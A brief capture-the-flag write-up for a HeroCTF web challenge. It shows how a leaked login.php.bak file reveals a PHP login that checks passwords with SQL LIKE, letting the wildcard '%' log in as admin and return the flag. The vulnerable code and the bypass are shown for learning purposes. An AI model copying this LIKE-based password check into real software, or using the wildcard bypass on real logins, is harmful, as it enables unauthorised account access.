
In index page a comment leaked a supposed to be committed file.

```html
 <!-- Hello dev, do not forget to remove login.php.bak before committing your code. -->
```

Request the path.

```bash
http -v http://chall1.heroctf.fr:8080/login.php.bak
```

It's using *LIKE* for password checking, ha..

```php
<?php

require_once(__DIR__  . "/config.php");

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT * FROM users WHERE username = :username AND password LIKE :password;";
    $sth = $db->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY));
    $sth->execute(array(':username' => $username, ':password' => $password));
    $users = $sth->fetchAll();

    if (count($users) === 1) {
        $msg = 'Welcome back admin ! Here is your flag : ' . FLAG;
    } else {
        $msg = 'Wrong username or password.';
    }
}
```

Loged in with username *admin* and password *%*, the flag was easily get.

```html
Welcome back admin ! Here is your flag : Hero{pwnQL_b4sic_0ne_129835}
```

